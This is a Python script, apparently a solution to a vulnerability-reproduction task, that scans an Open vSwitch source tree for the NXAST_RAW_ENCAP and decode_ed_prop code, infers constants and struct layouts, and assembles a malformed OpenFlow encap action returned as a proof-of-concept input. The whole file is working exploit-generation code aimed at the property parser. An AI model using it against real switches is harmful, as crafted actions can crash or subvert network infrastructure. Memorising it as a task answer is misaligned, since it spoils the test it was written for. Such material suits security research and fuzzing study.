import os
import re
import tarfile
import struct
from typing import Dict, List, Tuple, Optional, Iterable


def _is_tar_path(p: str) -> bool:
    lp = p.lower()
    return os.path.isfile(p) and (lp.endswith(".tar") or lp.endswith(".tar.gz") or lp.endswith(".tgz") or lp.endswith(".tar.bz2") or lp.endswith(".tbz2") or lp.endswith(".tar.xz") or lp.endswith(".txz"))


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".hh") or lfn.endswith(".cpp") or lfn.endswith(".hpp")):
                    continue
                path = os.path.join(root, fn)
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    rel = os.path.relpath(path, src_path).replace("\\", "/")
                    yield rel, data
                except Exception:
                    continue
        return

    if _is_tar_path(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cc") or lname.endswith(".hh") or lname.endswith(".cpp") or lname.endswith(".hpp")):
                        continue
                    if m.size > 8 * 1024 * 1024:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return


def _decode_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return b.decode("latin-1", errors="ignore")


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    state = 0  # 0 normal, 1 line, 2 block, 3 string, 4 char
    while i < n:
        c = s[i]
        if state == 0:
            if c == '"' and (i == 0 or s[i - 1] != "\\"):
                out.append(c)
                state = 3
                i += 1
                continue
            if c == "'" and (i == 0 or s[i - 1] != "\\"):
                out.append(c)
                state = 4
                i += 1
                continue
            if c == "/" and i + 1 < n:
                c2 = s[i + 1]
                if c2 == "/":
                    state = 1
                    i += 2
                    continue
                if c2 == "*":
                    state = 2
                    i += 2
                    continue
            out.append(c)
            i += 1
        elif state == 1:
            if c == "\n":
                out.append(c)
                state = 0
            i += 1
        elif state == 2:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                state = 0
                i += 2
            else:
                i += 1
        elif state == 3:
            out.append(c)
            if c == '"' and (i == 0 or s[i - 1] != "\\"):
                state = 0
            i += 1
        else:
            out.append(c)
            if c == "'" and (i == 0 or s[i - 1] != "\\"):
                state = 0
            i += 1
    return "".join(out)


def _extract_function(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    m = re.search(r"\b" + re.escape(func_name) + r"\b\s*\(", text[idx:])
    if not m:
        return None
    start = idx + m.start()
    brace = text.find("{", start)
    if brace < 0:
        return None
    i = brace
    depth = 0
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


def _find_ofp_actions_c(texts: Dict[str, str]) -> Optional[str]:
    best = None
    for name in texts:
        ln = name.lower()
        if ln.endswith("ofp-actions.c") or ln.endswith("/ofp-actions.c") or ln.endswith("\\ofp-actions.c"):
            best = name
            break
    if best:
        return best
    for name, t in texts.items():
        if "decode_NXAST_RAW_ENCAP" in t or "decode_ed_prop" in t:
            if "ofp-actions.c" in name.lower():
                return name
    for name, t in texts.items():
        if "decode_NXAST_RAW_ENCAP" in t and "ofp-actions" in name.lower():
            return name
    return None


def _collect_relevant_texts(src_path: str) -> Dict[str, str]:
    keys = (
        b"decode_NXAST_RAW_ENCAP",
        b"decode_ed_prop",
        b"NXAST_RAW_ENCAP",
        b"NX_VENDOR_ID",
        b"NX_VENDOR",
        b"OFPEDPT_",
        b"ofp_ed_prop",
        b"nx_action_raw_encap",
        b"RAW_ENCAP",
        b"ed_prop",
        b"encap",
    )
    out: Dict[str, str] = {}
    for name, data in _iter_source_files(src_path):
        if not any(k in data for k in keys):
            continue
        out[name] = _decode_text(data)
    return out


def _sanitize_expr(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(", "(", expr)
    expr = re.sub(r"\bINT(?:8|16|32|64)_C\s*\(", "(", expr)
    expr = re.sub(r"\bhtons\s*\(", "(", expr)
    expr = re.sub(r"\bhtonl\s*\(", "(", expr)
    expr = re.sub(r"\bntohs\s*\(", "(", expr)
    expr = re.sub(r"\bntohl\s*\(", "(", expr)
    expr = re.sub(r"\b(?:u?int(?:8|16|32|64)_t|size_t|ssize_t|long|short|unsigned|signed|int|char|bool|ovs_be(?:16|32|64))\b", "", expr)
    expr = re.sub(r"\(\s*\)", "", expr)
    expr = re.sub(r"\b([0-9A-Fa-fx]+)\s*([uUlL]+)\b", r"\1", expr)
    expr = expr.strip()
    return expr


def _safe_eval_int(expr: str, consts: Dict[str, int]) -> Optional[int]:
    expr = _sanitize_expr(expr)
    if not expr:
        return None

    def repl_id(m: re.Match) -> str:
        ident = m.group(0)
        if ident in consts:
            return str(consts[ident])
        return ident

    expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_id, expr)
    if re.search(r"\b[A-Za-z_]\w*\b", expr2):
        return None
    if not re.fullmatch(r"[0-9xXa-fA-F \t\(\)\+\-\*/%<>&\|\^~.,]+", expr2):
        return None
    expr2 = expr2.replace(",", "")
    try:
        v = eval(expr2, {"__builtins__": None}, {})
        if isinstance(v, int):
            return v
        if isinstance(v, bool):
            return int(v)
        return None
    except Exception:
        return None


def _build_constants(texts: Dict[str, str]) -> Dict[str, int]:
    consts: Dict[str, int] = {}
    defines_expr: Dict[str, str] = {}
    enum_exprs: List[List[Tuple[str, Optional[str]]]] = []

    for t in texts.values():
        tc = _strip_c_comments(t)
        for line in tc.splitlines():
            if "#define" not in line:
                continue
            m = re.match(r"^\s*#\s*define\s+([A-Z_][A-Z0-9_]*)\s*(\(([^)]*)\))?\s+(.*)$", line)
            if not m:
                continue
            name = m.group(1)
            if m.group(2) is not None:
                continue
            expr = m.group(4).strip()
            if not expr:
                continue
            if expr.startswith("\\"):
                continue
            expr = expr.split("\\")[0].strip()
            defines_expr[name] = expr

        # enums
        idx = 0
        while True:
            m = re.search(r"\benum\b", tc[idx:])
            if not m:
                break
            epos = idx + m.start()
            brace = tc.find("{", epos)
            if brace < 0:
                idx = epos + 4
                continue
            # quick sanity: must have '}' after
            close = tc.find("}", brace)
            if close < 0:
                idx = brace + 1
                continue
            # match braces
            i = brace
            depth = 0
            n = len(tc)
            while i < n:
                if tc[i] == "{":
                    depth += 1
                elif tc[i] == "}":
                    depth -= 1
                    if depth == 0:
                        close = i
                        break
                i += 1
            inside = tc[brace + 1:close]
            idx = close + 1

            if len(inside) > 200000:
                continue
            parts = [p.strip() for p in inside.split(",")]
            enum_items: List[Tuple[str, Optional[str]]] = []
            for p in parts:
                if not p:
                    continue
                if p.startswith("#"):
                    continue
                m2 = re.match(r"^([A-Za-z_]\w*)(?:\s*=\s*(.+))?$", p, flags=re.S)
                if not m2:
                    continue
                nm = m2.group(1)
                ex = m2.group(2).strip() if m2.group(2) else None
                enum_items.append((nm, ex))
            if enum_items:
                enum_exprs.append(enum_items)

    # Iteratively resolve defines
    progress = True
    for _ in range(40):
        if not progress:
            break
        progress = False
        for k, ex in list(defines_expr.items()):
            if k in consts:
                continue
            v = _safe_eval_int(ex, consts)
            if v is not None:
                consts[k] = int(v)
                progress = True

    # Resolve enums in order, allowing references
    for items in enum_exprs:
        prev = None
        for nm, ex in items:
            if ex is None:
                if prev is None:
                    prev = 0
                else:
                    prev += 1
                if nm not in consts:
                    consts[nm] = prev
            else:
                v = _safe_eval_int(ex, consts)
                if v is None:
                    continue
                prev = int(v)
                if nm not in consts:
                    consts[nm] = prev

    # Another pass for defines after enums
    progress = True
    for _ in range(60):
        if not progress:
            break
        progress = False
        for k, ex in list(defines_expr.items()):
            if k in consts:
                continue
            v = _safe_eval_int(ex, consts)
            if v is not None:
                consts[k] = int(v)
                progress = True

    return consts


def _find_token_expr(texts: Dict[str, str], token: str) -> Optional[str]:
    pat_define = re.compile(r"^\s*#\s*define\s+" + re.escape(token) + r"\s+(.+?)\s*$", re.M)
    pat_enum = re.compile(r"\b" + re.escape(token) + r"\b\s*=\s*([^,}]+)")
    for t in texts.values():
        tc = _strip_c_comments(t)
        m = pat_define.search(tc)
        if m:
            return m.group(1).strip()
    for t in texts.values():
        tc = _strip_c_comments(t)
        m = pat_enum.search(tc)
        if m:
            return m.group(1).strip()
    return None


def _choose_prop_token(decode_ed_prop_func: Optional[str]) -> Optional[str]:
    if not decode_ed_prop_func:
        return None
    body = _strip_c_comments(decode_ed_prop_func)
    cases = re.findall(r"\bcase\s+([A-Za-z_]\w*)\s*:", body)
    if not cases:
        return None
    for c in cases:
        uc = c.upper()
        if "RAW" in uc and ("ED" in uc or "PROP" in uc or "PT" in uc):
            return c
    for c in cases:
        uc = c.upper()
        if "RAW" in uc:
            return c
    for c in cases:
        uc = c.upper()
        if "EXPERIMENTER" not in uc and "EXP" not in uc and "PAD" not in uc:
            return c
    return cases[0]


class _CStructDB:
    def __init__(self, texts: Dict[str, str]):
        self.texts = texts
        self.def_cache: Dict[str, str] = {}
        self.fields_cache: Dict[str, List[Tuple[str, str, int]]] = {}
        self.size_cache: Dict[str, int] = {}

    def _find_struct_def(self, name: str) -> Optional[str]:
        if name in self.def_cache:
            return self.def_cache[name]
        pat = re.compile(r"\bstruct\s+" + re.escape(name) + r"\b")
        for t in self.texts.values():
            tc = _strip_c_comments(t)
            for m in pat.finditer(tc):
                pos = m.start()
                brace = tc.find("{", pos)
                if brace < 0 or brace - pos > 400:
                    continue
                # match braces
                i = brace
                depth = 0
                n = len(tc)
                while i < n:
                    if tc[i] == "{":
                        depth += 1
                    elif tc[i] == "}":
                        depth -= 1
                        if depth == 0:
                            block = tc[brace + 1:i]
                            self.def_cache[name] = block
                            return block
                    i += 1
        self.def_cache[name] = ""
        return None

    def _parse_fields(self, name: str) -> Optional[List[Tuple[str, str, int]]]:
        if name in self.fields_cache:
            return self.fields_cache[name]
        block = self._find_struct_def(name)
        if not block:
            self.fields_cache[name] = []
            return None
        b = block
        b = re.sub(r"^\s*#.*$", "", b, flags=re.M)
        stmts = [s.strip() for s in b.split(";")]
        fields: List[Tuple[str, str, int]] = []
        for st in stmts:
            if not st:
                continue
            if st.startswith("union ") or st.startswith("struct ") and "{" in st:
                continue
            st = re.sub(r"\s+", " ", st).strip()
            m = re.match(r"^(.*?)\s+(.+)$", st)
            if not m:
                continue
            ctype = m.group(1).strip()
            vars_part = m.group(2).strip()
            if ctype.startswith("OVS_") or ctype.startswith("__"):
                continue
            for v in [x.strip() for x in vars_part.split(",")]:
                v = v.replace("*", " ").strip()
                vm = re.match(r"^([A-Za-z_]\w*)\s*\[\s*(\d*)\s*\]$", v)
                if vm:
                    vn = vm.group(1)
                    ln = vm.group(2)
                    if ln == "":
                        count = 0
                    else:
                        try:
                            count = int(ln, 0)
                        except Exception:
                            count = 0
                    fields.append((ctype, vn, count))
                else:
                    vm2 = re.match(r"^([A-Za-z_]\w*)$", v)
                    if vm2:
                        fields.append((ctype, vm2.group(1), 1))
        self.fields_cache[name] = fields
        return fields

    def sizeof_type(self, ctype: str) -> Optional[int]:
        ctype = ctype.strip()
        ctype = re.sub(r"\b(const|volatile|register|static)\b", "", ctype).strip()
        ctype = re.sub(r"\s+", " ", ctype)
        if ctype.startswith("struct "):
            sn = ctype.split(" ", 1)[1].strip()
            return self.sizeof_struct(sn)
        if ctype.startswith("enum "):
            return 4
        base = ctype
        mapping = {
            "uint8_t": 1,
            "int8_t": 1,
            "char": 1,
            "unsigned char": 1,
            "ovs_u8": 1,
            "uint16_t": 2,
            "int16_t": 2,
            "ovs_be16": 2,
            "ovs_u16": 2,
            "uint32_t": 4,
            "int32_t": 4,
            "ovs_be32": 4,
            "ovs_u32": 4,
            "uint64_t": 8,
            "int64_t": 8,
            "ovs_be64": 8,
            "ovs_u64": 8,
        }
        if base in mapping:
            return mapping[base]
        return None

    def sizeof_struct(self, name: str) -> Optional[int]:
        if name in self.size_cache:
            return self.size_cache[name]
        fields = self._parse_fields(name)
        if not fields:
            self.size_cache[name] = 0
            return None
        sz = 0
        for ctype, _, count in fields:
            if count == 0:
                continue
            ts = self.sizeof_type(ctype)
            if ts is None:
                self.size_cache[name] = 0
                return None
            sz += ts * count
        self.size_cache[name] = sz
        return sz

    def pack_struct(self, name: str, ctx: Dict[str, int]) -> Optional[bytes]:
        fields = self._parse_fields(name)
        if not fields:
            return None
        out = bytearray()
        for ctype, fname, count in fields:
            if count == 0:
                continue
            if ctype.strip().startswith("struct "):
                sn = ctype.strip().split(" ", 1)[1].strip()
                for _ in range(count):
                    b = self.pack_struct(sn, ctx)
                    if b is None:
                        return None
                    out += b
                continue
            ts = self.sizeof_type(ctype)
            if ts is None:
                return None
            if count > 1:
                out += b"\x00" * (ts * count)
                continue
            val = 0
            fl = fname.lower()
            if fl == "type":
                val = ctx.get("action_type", 0xFFFF)
            elif fl == "len":
                val = ctx.get("action_len", 0)
            elif fl in ("vendor", "experimenter", "vendor_id", "vendorid"):
                val = ctx.get("vendor_id", 0x00002320)
            elif fl == "subtype":
                val = ctx.get("subtype", 0)
            elif "n_props" in fl or "nproperties" in fl or "n_ed_props" in fl:
                val = ctx.get("n_props", 1)
            elif "props_len" in fl or "properties_len" in fl or fl == "propslen":
                val = ctx.get("props_len", 0)
            elif "packet_type" in fl or fl == "packettype":
                val = ctx.get("packet_type", 0)
            else:
                val = 0
            if ts == 1:
                out += struct.pack("!B", val & 0xFF)
            elif ts == 2:
                out += struct.pack("!H", val & 0xFFFF)
            elif ts == 4:
                out += struct.pack("!I", val & 0xFFFFFFFF)
            elif ts == 8:
                out += struct.pack("!Q", val & 0xFFFFFFFFFFFFFFFF)
            else:
                out += b"\x00" * ts
        return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = _collect_relevant_texts(src_path)
        if not texts:
            return b""

        ofp_actions_name = _find_ofp_actions_c(texts)
        ofp_actions_text = texts.get(ofp_actions_name, "") if ofp_actions_name else ""

        decode_raw_encap_struct = None
        if ofp_actions_text:
            m = re.search(r"\bdecode_NXAST_RAW_ENCAP\s*\(\s*const\s+struct\s+([A-Za-z_]\w*)\s*\*", ofp_actions_text)
            if m:
                decode_raw_encap_struct = m.group(1)

        decode_ed_prop = None
        if ofp_actions_text:
            decode_ed_prop = _extract_function(ofp_actions_text, "decode_ed_prop")

        prop_token = _choose_prop_token(decode_ed_prop)
        consts = _build_constants(texts)

        vendor_id = None
        for k in ("NX_VENDOR_ID", "NX_EXPERIMENTER_ID", "NX_VENDOR", "NICIRA_VENDOR_ID"):
            if k in consts:
                vendor_id = consts[k]
                break
        if vendor_id is None:
            vendor_id = 0x00002320

        subtype = None
        if "NXAST_RAW_ENCAP" in consts:
            subtype = consts["NXAST_RAW_ENCAP"]
        else:
            expr = _find_token_expr(texts, "NXAST_RAW_ENCAP")
            if expr:
                v = _safe_eval_int(expr, consts)
                if v is not None:
                    subtype = int(v)
        if subtype is None:
            subtype = 0

        action_type = consts.get("OFPAT_EXPERIMENTER", consts.get("OFPAT_VENDOR", 0xFFFF)) & 0xFFFF

        prop_type = None
        if prop_token and prop_token in consts:
            prop_type = consts[prop_token] & 0xFFFF
        elif prop_token:
            expr = _find_token_expr(texts, prop_token)
            if expr:
                v = _safe_eval_int(expr, consts)
                if v is not None:
                    prop_type = int(v) & 0xFFFF
        if prop_type is None:
            for cand in ("OFPEDPT_RAW", "NX_ED_PROP_RAW", "NX_EDPT_RAW", "OFPEDPT_DATA", "OFPEDPT_PACKET", "OFPEDPT_HEADER"):
                if cand in consts:
                    prop_type = consts[cand] & 0xFFFF
                    break
        if prop_type is None:
            prop_type = 1

        # Determine action fixed size and packing strategy
        db = _CStructDB(texts)
        fixed_size = None
        use_struct_pack = False
        if decode_raw_encap_struct:
            sz = db.sizeof_struct(decode_raw_encap_struct)
            if sz is not None and sz > 0:
                fixed_size = sz
                use_struct_pack = True

        if fixed_size is None:
            fixed_size = 16
            use_struct_pack = False

        # Choose total length (multiple of 8) close to 72
        if fixed_size <= 64:
            total_len = 72
        else:
            total_len = ((fixed_size + 8 + 7) // 8) * 8
        if total_len < fixed_size + 8:
            total_len = ((fixed_size + 8 + 7) // 8) * 8
        prop_len = total_len - fixed_size
        prop_len = (prop_len // 8) * 8
        if prop_len < 8:
            total_len = ((fixed_size + 8 + 7) // 8) * 8
            prop_len = total_len - fixed_size
        if prop_len < 8:
            prop_len = 8
            total_len = fixed_size + prop_len
            total_len = ((total_len + 7) // 8) * 8
            prop_len = total_len - fixed_size

        n_props = 1
        packet_type = consts.get("PT_ETH", 0x00000800) & 0xFFFFFFFF

        ctx = {
            "action_type": action_type,
            "action_len": total_len & 0xFFFF,
            "vendor_id": vendor_id & 0xFFFFFFFF,
            "subtype": subtype & 0xFFFF,
            "n_props": n_props & 0xFFFF,
            "props_len": prop_len & 0xFFFF,
            "packet_type": packet_type,
        }

        fixed = None
        if use_struct_pack and decode_raw_encap_struct:
            fixed = db.pack_struct(decode_raw_encap_struct, ctx)

        if not fixed or len(fixed) != fixed_size:
            # Fallback packed guess: type,len,vendor,subtype,n_props,packet_type
            # Total fixed size 16 bytes.
            fixed = bytearray()
            fixed += struct.pack("!H", action_type)
            fixed += struct.pack("!H", total_len & 0xFFFF)
            fixed += struct.pack("!I", vendor_id & 0xFFFFFFFF)
            fixed += struct.pack("!H", subtype & 0xFFFF)
            # if our guessed fixed_size differs, pad/trim accordingly
            if fixed_size >= 16:
                fixed += struct.pack("!H", n_props & 0xFFFF)
                fixed += struct.pack("!I", packet_type & 0xFFFFFFFF)
                if len(fixed) < fixed_size:
                    fixed += b"\x00" * (fixed_size - len(fixed))
                fixed = fixed[:fixed_size]
            else:
                fixed = fixed[:fixed_size]

        payload_len = prop_len - 4
        if payload_len < 0:
            payload_len = 0
        payload = bytes((i * 13 + 7) & 0xFF for i in range(payload_len))
        prop = struct.pack("!HH", prop_type & 0xFFFF, prop_len & 0xFFFF) + payload

        poc = bytes(fixed) + prop
        if len(poc) != total_len:
            if len(poc) < total_len:
                poc += b"\x00" * (total_len - len(poc))
            else:
                poc = poc[:total_len]
        return poc